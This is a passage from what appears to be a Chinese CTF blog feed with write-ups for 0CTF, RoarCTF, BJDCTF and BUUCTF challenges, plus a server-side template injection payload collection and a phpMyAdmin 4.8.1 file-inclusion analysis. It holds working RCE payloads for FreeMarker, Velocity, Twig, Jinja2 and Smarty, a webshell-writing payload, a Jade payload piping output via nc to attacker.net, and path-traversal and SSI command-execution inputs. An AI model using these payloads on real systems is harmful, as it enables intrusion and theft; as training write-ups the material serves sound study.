class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">这里<span class="number">34</span>个where加上<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;一共204个字符，在filter方法里34个where会被hacker替代，34个hacker就有204个字符此时，"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;不再是一大串where的一部分，s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>也不是简单的字符串了，在序列化时会被解析成profile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure><p>下面就是注册登录更新信息，在profile.php中拿到base64码，解密拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[0CTF piapiapia]
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2020/02/19/RoarCTF/"/>
    <id>http://yoursite.com/2020/02/19/RoarCTF/</id>
    <published>2020-02-19T10:10:44.000Z</published>
    <updated>2020-03-12T01:24:46.018Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>打开题目出现的是一个登录界面</p><img src="/2020/02/19/RoarCTF/java.png" class="" title="examplename"><p>点击help出现了提示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>用burp抓包,但是怎么改都无法下载或者打开help.docx，后面尝试把GET改成了POST，成功打开了这个文件</p><p>由于题目是跟java有关系，就去百度了，找到了一篇很详细的文章，这里是重点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml泄露</span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>尝试WEB-INF/web.xml找到了疑似flag文件的东西…</p><img src="/2020/02/19/RoarCTF/java1.png" class="" title="examplename"><p>可以看到有一个com.wm.ctf.FlagController</p><p>构造payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p><img src="/2020/02/19/RoarCTF/java2.png" class="" title="examplename"><p>可以看到一串base64编码的字符,解码即可得到flag.</p><h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>是一道计算器的题，直接看网页源码找到了一个叫calc.php的文件，可以访问</p><img src="/2020/02/19/RoarCTF/calc.png" class="" title="examplename"><p>可以看出payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符,而且前面有提示说加上了WAF,这道题我们可以用%20来进行绕过WAF</p><p>接下来的内容是刚刚从一篇博客学到的新知识，在这之前并不知道(我太菜了…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的文件操作函数：</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string $path) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure><p>有了上面的这些操作函数,那么就看可以找flag了…</p><p>一层层往上找</p><img src="/2020/02/19/RoarCTF/java3.png" class="" title="examplename"><p>在这里找到了f1agg的文件,但是/是被过滤的,这里不能直接用<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p><p>想到了用ascii码来进行绕过,用’.’来进行拼接</p><p>payload：<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))；</code></p><p>顺利拿到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-Easy-Java&quot;&gt;&lt;a href=&quot;#1-Easy-Java&quot; class=&quot;headerlink&quot; title=&quot;1.Easy Java&quot;&gt;&lt;/a&gt;1.Easy Java
    
    </summary>
    
    
    
      <category term="something import" scheme="http://yoursite.com/tags/something-import/"/>
    
  </entry>
  
  <entry>
    <title>服务端模板注入</title>
    <link href="http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-02-12T08:28:20.000Z</published>
    <updated>2020-03-13T09:57:17.770Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01:简介"></a>0x01:简介<a id="more"></a></h4><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><h4 id="0x02-服务端模板引擎"><a href="#0x02-服务端模板引擎" class="headerlink" title="0x02:服务端模板引擎"></a>0x02:服务端模板引擎</h4><p><strong>PHP</strong>：Smarty、Twig；</p><p><strong>Java</strong>：Freemarker、Velocity；</p><p><strong>Python</strong>：Jinja2、Tornado、Marko；</p><p><strong>Ruby</strong>：Slim、ERB；</p><p><strong>NodeJS</strong>：Jade等</p><h4 id="0x03：注入手法（ps-这是一张找来的图片）"><a href="#0x03：注入手法（ps-这是一张找来的图片）" class="headerlink" title="0x03：注入手法（ps:这是一张找来的图片）"></a>0x03：注入手法（ps:这是一张找来的图片）</h4><p> 对于模板注入漏洞的研究可以参考SQL注入，客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p><p> 漏洞发现及利用步骤分为：探测、判断、利用（读取、探索、攻击）</p><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class="" title="examplename"><h4 id="0x04：判断漏洞"><a href="#0x04：判断漏洞" class="headerlink" title="0x04：判断漏洞"></a>0x04：判断漏洞</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class="" title="examplename"><p>通过图片中的payload可以快速判断</p><p>绿线表示成功，红线失败。49会在 Twig 中返回49，而在 Jinja2 中则是7777777</p><h4 id="1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解"><a href="#1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解" class="headerlink" title="1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解"></a>1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解</h4><p>FreeMaker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure><p>Velocity:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;输出 tomcat7</span><br></pre></td></tr></table></figure><p>Smarty:</p><p>1)写文件创建后门:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>2)任意读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure><p>Twig:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;返回结果： uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure><p>jade:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure><p>python模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>一些补充：</p><h3 id="flask的变量和函数"><a href="#flask的变量和函数" class="headerlink" title="flask的变量和函数"></a>flask的变量和函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flask 中有内置的的变量函数 ，那些特殊的变量可以实现某些功能</span><br><span class="line"></span><br><span class="line">config ：可以从模板中直接访问Flask当前的config对象：&#123;&#123;config.SQLALCHEMY_DATABASE_URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">request : 就是flask中代表当前请求的request对象 ， &#123;&#123;request.url&#125;&#125;</span><br><span class="line"></span><br><span class="line">session :为Flask的session对象 ,&#123;&#123;session.new&#125;&#125; True</span><br><span class="line"></span><br><span class="line">g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出&#123;&#123;g.name&#125;&#125;</span><br><span class="line"></span><br><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br><span class="line"></span><br><span class="line">&#123;%for message in get_flashed_messages()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01:简介&quot;&gt;&lt;/a&gt;0x01:简介
    
    </summary>
    
    
    
      <category term="模板注入" scheme="http://yoursite.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1任意文件包含</title>
    <link href="http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-02-07T10:36:39.000Z</published>
    <updated>2020-03-12T01:23:19.142Z</updated>
    
    <content type="html"><![CDATA[<p>phpmyadmin简述：<a id="more"></a></p><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><p>0x01影响版本</p><p>phpmyadmin4.8.1</p><p>0x02漏洞分析</p><p>下面的内容借鉴了ChaMd5安全团队的文章，附上链接：<code>https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>​    总的来说呢，问题就出现在这一块代码，可以利用这个函数来进行绕过白名单检测，？两次url编码为%253f就可以绕过验证</p><p>0x03例题分析</p><p>下面是一道buuctf上的题目:warmup</p><p>打开题目出现的是一个表情，直接来看网页的源码，发现了提示有source.php的文件</p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" class="" title="examplename"><p>访问source.php，看到了源码</p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" class="" title="examplename"><p>做这道题目的时候其实我并不知道这是phpmyadmin4.8.1漏洞，所以当时找了一篇wp</p><p>在学习了这个漏洞之后，大概就清楚了这段代码是什么意思，很明显这里有我在上面附上的那段代码，那么就可以直接来构造payload了，对了要先访问hint.php会得到提示说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>所以，payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://efeb72fa-cfeb-4026-8537-6857f5beace4.node3.buuoj.cn/index.php?file=hint.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>这样就得到了flag:<code>flag{658a2242-c7eb-42fe-8856-76b69e728c0f}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpmyadmin简述：
    
    </summary>
    
    
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTFwp</title>
    <link href="http://yoursite.com/2020/01/17/BJDCTFwp/"/>
    <id>http://yoursite.com/2020/01/17/BJDCTFwp/</id>
    <published>2020-01-17T08:15:06.000Z</published>
    <updated>2020-03-12T01:27:44.125Z</updated>
    
    <content type="html"><![CDATA[<p>Misc</p><ol><li>签个到？<a id="more"></a></li></ol><p>文件下载下来是个压缩包，解压缩发现里面还有一个压缩包，直接解压提示文件损坏解压失败</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B0.png" class="" title="examplename"><p>不假思索，直接丢到kali里面，foremost一下，分离出了一张图片，打开是二维码，扫一扫，拿到Flag</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B01.png" class="" title="examplename"><ol start="2"><li>你猜我是个啥？</li></ol><p>下载过来是一个压缩包，发现打不开，想到可能是文件后缀的问题，丢到winhex里面发现了是png图片，正想要改后缀的时候，把winhex直接拉到底发现了Flag</p><img src="/2020/01/17/BJDCTFwp/cai.png" class="" title="examplename"><ol start="3"><li>鸡你太美</li></ol><p>压缩包解压，一个是gif，一个是它的副本，把gif文件丢到winhex里面，没有发现什么有用的东西。本着试试的想法，把副本丢到winhex里面，发现最开头有9a，再想到前面的是gif文件，gif文件头刚好是GIF89a，把文件头补全重新保存为GIF文件，Flag出来了。</p><img src="/2020/01/17/BJDCTFwp/%E9%B8%A1%E5%A4%AA%E7%BE%8E.png" class="" title="examplename"><ol start="4"><li>just a rar</li></ol><p>下载下来是一个压缩包，里面有一个四位数.rar的文件，直接上工具进行爆破.</p><img src="/2020/01/17/BJDCTFwp/rar.png" class="" title="examplename"><p>密码是2016，打开解压缩得到一张图片，放到winhex里面什么东西都没有，放到kali里，binwalk，foremost都没有什么东西</p><p>突然想到以前做过的一道题，打开属性，在备注里找到了flag</p><img src="/2020/01/17/BJDCTFwp/rar1.png" class="" title="examplename"><p>Crypto</p><ol><li>sign in</li></ol><p>打开是这样的<img src="/2020/01/17/BJDCTFwp/signin1.png" class="" title="examplename"></p><p>把base16，64，32挨个试一下，是base16加密</p><p>找一个线解密网站</p><img src="/2020/01/17/BJDCTFwp/signin.png" class="" title="examplename"><ol start="2"><li>编制与调制</li></ol><p>打开下载文件得到一个txt文件和一个带hint的图片，根据hint的图片猜测是曼彻斯特加密</p><p>网上搜到了一个脚本，拿过来跑一下就出来了</p><img src="/2020/01/17/BJDCTFwp/%E7%BC%96%E5%88%B6.png" class="" title="examplename"><ol start="3"><li>Polybius</li></ol><p>打开文件</p><img src="/2020/01/17/BJDCTFwp/polybius.png" class="" title="examplename"><p>Hintbase64解密得到提示明文是16位数字</p><p>百度了一下找到了对应的棋盘加密，不过棋盘有改动，想到flag大多是一句话，那就一个个试</p><img src="/2020/01/17/BJDCTFwp/%E6%A3%8B%E7%9B%98.jpg" class="" title="examplename"><p>手动对应解密，得到flag：BJD{flagispolybius}</p><p>4.EASYRSA</p><img src="/2020/01/17/BJDCTFwp/RSA1.png" class="" title="examplename"><p>打开拿到的一段代码，上网搜了一下有关RSA加密的知识，再找了一个可攻击的脚本来进行反解先得到p和q，再来解m的值，最后long_to_bytes(m)就可以得到flag了</p><img src="/2020/01/17/BJDCTFwp/rsa.png" class="" title="examplename"><p>Web</p><p>1.Hello World</p><p>打开题目地址，点击sketch included，就是界面开始的那个，出现文字注意你的id，用burp suite抓包，根据放出来的hint是id与admin有关</p><p>同时在burp中看到id的格式，在请求头中添加id:admin+base64(admin),send一下，返回如下</p><img src="/2020/01/17/BJDCTFwp/hello4.png" class="" title="examplename"><p>X-Forwarded-For:127.0.0.1</p><img src="/2020/01/17/BJDCTFwp/hello1.png" class="" title="examplename"><p>Referer:<a href="https://google.com" target="_blank" rel="noopener">https://google.com</a></p><img src="/2020/01/17/BJDCTFwp/hello2.png" class="" title="examplename"><p>2.easy_upload</p><p>上传一句话木马，以jpg格式上传，访问提示给的地址</p><img src="/2020/01/17/BJDCTFwp/upload2.png" class="" title="examplename"><p>参考了一篇博客，学到了直接读取文件中的内容</p><img src="/2020/01/17/BJDCTFwp/upload.png" class="" title="examplename"><p>3.Hidden serects</p><p>抓一下包，可以发现有一段password</p><img src="/2020/01/17/BJDCTFwp/hidden.png" class="" title="examplename"><p>通过尝试发现是md5加密</p><p>解密登录网站</p><p>打开发现还是没什么东西，F12和ctrl键都不能用</p><p>这里我用了一个插件叫restclient,找到flag</p><img src="/2020/01/17/BJDCTFwp/hidden1.png" class="" title="examplename"><p>4.easy md5</p><p>抓一下包，在反应头里有一个hint</p><img src="/2020/01/17/BJDCTFwp/MD51.png" class="" title="examplename"><p>根据树哥的一篇md5博客照着写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98&#x2F;](https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5的一系列问题&#x2F;)</span><br></pre></td></tr></table></figure><p>先提交ffifdyop，查看页面源码</p><img src="/2020/01/17/BJDCTFwp/MD52.png" class="" title="examplename"><p>发现是md5弱比较</p><p>构造payload?a=QNKCDZO&amp;b=aabg7XSs，得到</p><img src="/2020/01/17/BJDCTFwp/MD53.png" class="" title="examplename}强比较，没有规定字符串如果这个时候传入的是数组不是字符串，md5（）函数无法解出其数值并且不会报错，就会得到数值相等 {%asset_img md54.png examplename"><p>5.Mark loves cat</p><p>打开题目地址，没发现什么</p><p>用敏感目录扫描工具 syc-scan</p><p>python3 syc.py <a href="http://222.186.56.247:8105/" target="_blank" rel="noopener">http://222.186.56.247:8105/</a></p><p>发现存在git泄露</p><p>用git_extract 工具进行恢复</p><p>python git_extract.py <a href="http://222.186.56.247:8105/.git/" target="_blank" rel="noopener">http://222.186.56.247:8105/.git/</a></p><p>在目录下生成了一个新的文件，打开是</p><img src="/2020/01/17/BJDCTFwp/mark.png" class="" title="examplename"><p>要绕过这三个条件才能得到flag</p><p>构造payload：?arc=flag&amp;flag=arc&amp;_GET=ntr post请求:_POST[flag]=fuck</p><img src="/2020/01/17/BJDCTFwp/mark2.png" class="" title="examplename"><ol start="6"><li>这序列化也太简单了吧</li></ol><p>是一道反序列化题</p><p>在网上找了好多博客研究了半天，搞懂了一点一点</p><img src="/2020/01/17/BJDCTFwp/se1.png" class="" title="examplename"><p>把传入的序列化字符串的属性个数更改成大于 1 的任何数来绕过_wakeup()</p><img src="/2020/01/17/BJDCTFwp/se.png" class="" title="examplename"><p>7.zjctf</p><p>通过text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=写入那句话,再用file=php://filter/read=convert.base64-encode/resource=next.php以base64的方式读取文件，base64解密得到next.php文件</p><p>通过测试/next.php?\S*=${getFlag()}&amp;cmd=system(“cd ../../../;ls”)发现根目录下有flag</p><p>构造payload：/next.php?\S*=${getFlag()}&amp;cmd=system(“cat /flag”)</p><img src="/2020/01/17/BJDCTFwp/zjctf.png" class="" title="examplename"><p>8.The_mystery_of_ip</p><p>点击flag出现了ip，抓包</p><p>猜测可能是smarty模板注入，改一下x-forwarded-for:{if phpindfo()}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip1.png" class="" title="examplename"><p>底下成功显示了phpinfo的页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改x-forwarded-for的值查询列表：X-Forwarded-For: {if system(‘ls’)}{/if}</p><p>可以发现出现了当前目录下的文件</p><p>X-Forwarded-For: {if system(“cd ../../../;ls”)}{/if}向上层文件遍历目录</p><img src="/2020/01/17/BJDCTFwp/ip2.png" class="" title="examplename"><p>发现了flag文件，接下来就是读取X-Forwarded-For: {if system(“cat /flag”)}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip3.png" class="" title="examplename"><p>9.easy_search</p><p>根据hint是vim泄漏，<a href="http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666" target="_blank" rel="noopener">http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666</a></p><p>账号随便输一个，写上密码，burp抓包</p><p>看到有一个url_is_here</p><p>猜测是ssi注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easy_search.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easysearch2.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#execcmd&#x3D;&quot;cat..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/search3.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Misc&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;签个到？
    
    </summary>
    
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-01-16T06:32:30.000Z</published>
    <updated>2020-02-09T00:50:10.331Z</updated>
    
